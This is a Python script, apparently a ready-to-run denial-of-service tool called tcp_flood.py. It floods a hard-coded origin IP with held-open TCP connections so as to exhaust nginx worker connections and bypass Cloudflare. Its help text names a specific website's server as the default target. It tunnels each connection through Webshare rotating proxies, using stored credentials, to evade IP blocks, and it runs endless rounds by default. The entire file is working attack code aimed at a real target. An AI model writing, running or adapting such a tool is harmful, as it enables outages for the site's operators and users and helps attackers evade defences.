#!/usr/bin/env python3
"""
tcp_flood.py — raw TCP connection flood to target origin IP

Bypasses Cloudflare entirely — connects directly to the origin server.
No HTTP/PHP involved — holds TCP connections open to exhaust nginx
worker_connections, causing CF→origin connections to queue or fail.

Supports Webshare backbone rotating proxy via HTTP CONNECT tunnel:
each connection exits from a different rotating IP, avoiding IP blocks.

Usage:
  tcp_flood.py --target 104.236.194.226
  tcp_flood.py --target 104.236.194.226 --webshare --concurrency 500
  tcp-flood --target 104.236.194.226 --webshare --concurrency 1000 --hold 30
  tcp-flood --target 104.236.194.226 --concurrency 500             # direct
"""
import os, sys, socket, base64, argparse, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed

INSTALL_DIR = os.path.dirname(os.path.abspath(__file__))
CREDS_FILE  = os.path.join(INSTALL_DIR, "proxies_webshare_backbone_creds.txt")
WS_HOST     = "p.webshare.io"
WS_PORT     = 80

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"

_lock  = threading.Lock()
_stats = {"ok": 0, "fail": 0, "n": 0}


def load_creds():
    with open(CREDS_FILE) as f:
        lines = [l.strip() for l in f if l.strip()]
    return lines[0], lines[1]


def _connect_direct(target, port, hold):
    s = socket.create_connection((target, port), timeout=10)
    time.sleep(hold)
    s.close()


def _connect_proxy(ws_user, ws_pass, target, port, hold):
    s = socket.create_connection((WS_HOST, WS_PORT), timeout=10)
    auth = base64.b64encode(f"{ws_user}:{ws_pass}".encode()).decode()
    req = (f"CONNECT {target}:{port} HTTP/1.1\r\n"
           f"Host: {target}:{port}\r\n"
           f"Proxy-Authorization: Basic {auth}\r\n\r\n")
    s.sendall(req.encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = s.recv(512)
        if not chunk:
            break
        buf += chunk
    if b" 200 " not in buf:
        s.close()
        raise Exception(f"CONNECT rejected: {buf[:80].decode(errors='replace')}")
    time.sleep(hold)
    s.close()


def one_conn(target, port, hold, use_ws, ws_user, ws_pass):
    with _lock:
        _stats["n"] += 1
        n = _stats["n"]
    t0 = time.time()
    try:
        if use_ws:
            _connect_proxy(ws_user, ws_pass, target, port, hold)
        else:
            _connect_direct(target, port, hold)
        elapsed = time.time() - t0
        with _lock:
            _stats["ok"] += 1
            print(f"  {G}[+]{W} [{n:>5}] held {elapsed:.1f}s  {'proxy' if use_ws else 'direct'}")
    except Exception as e:
        elapsed = time.time() - t0
        with _lock:
            _stats["fail"] += 1
            print(f"  {R}[!]{W} [{n:>5}] {elapsed:.1f}s  {str(e)[:70]}")


def run_round(rn, target, port, concurrency, hold, use_ws, ws_user, ws_pass):
    with _lock:
        _stats["ok"] = _stats["fail"] = _stats["n"] = 0
    print(f"\n{C}── Round {rn} {'─'*50}{W}")
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futs = [ex.submit(one_conn, target, port, hold, use_ws, ws_user, ws_pass)
                for _ in range(concurrency)]
        for f in as_completed(futs):
            pass
    ok, fail = _stats["ok"], _stats["fail"]
    total = ok + fail
    print(f"\n  round done  {G}{ok} connected{W}  {R}{fail} failed{W}  / {total} sent\n")
    return ok


def main():
    ap = argparse.ArgumentParser(description="TCP connection flood — origin bypass")
    ap.add_argument("--target",      default="104.236.194.226",
                    help="origin IP or hostname (default: metoo-buffalo.com VPS)")
    ap.add_argument("--port",        type=int, default=443)
    ap.add_argument("--concurrency", type=int, default=300,
                    help="simultaneous connections per round (default: 300)")
    ap.add_argument("--hold",        type=int, default=20,
                    help="seconds to hold each connection open (default: 20)")
    ap.add_argument("--rounds",      type=int, default=0,
                    help="rounds to run; 0 = infinite (default: 0)")
    ap.add_argument("--webshare",    action="store_true",
                    help="tunnel via Webshare backbone rotating proxy")
    args = ap.parse_args()

    ws_user = ws_pass = None
    if args.webshare:
        ws_user, ws_pass = load_creds()

    print(f"\n{'':=<70}")
    print(f"  tcp-flood  →  {args.target}:{args.port}")
    print(f"  Concurrency : {args.concurrency}")
    print(f"  Hold        : {args.hold}s per connection")
    print(f"  Rounds      : {'∞' if args.rounds == 0 else args.rounds}")
    print(f"  Proxy       : {'Webshare backbone rotating' if args.webshare else 'direct (no proxy)'}")
    print(f"{'':=<70}")

    rn = 0
    try:
        while args.rounds == 0 or rn < args.rounds:
            rn += 1
            run_round(rn, args.target, args.port, args.concurrency,
                      args.hold, args.webshare, ws_user, ws_pass)
    except KeyboardInterrupt:
        print(f"\n{Y}[!]{W} Interrupted.")


if __name__ == "__main__":
    main()
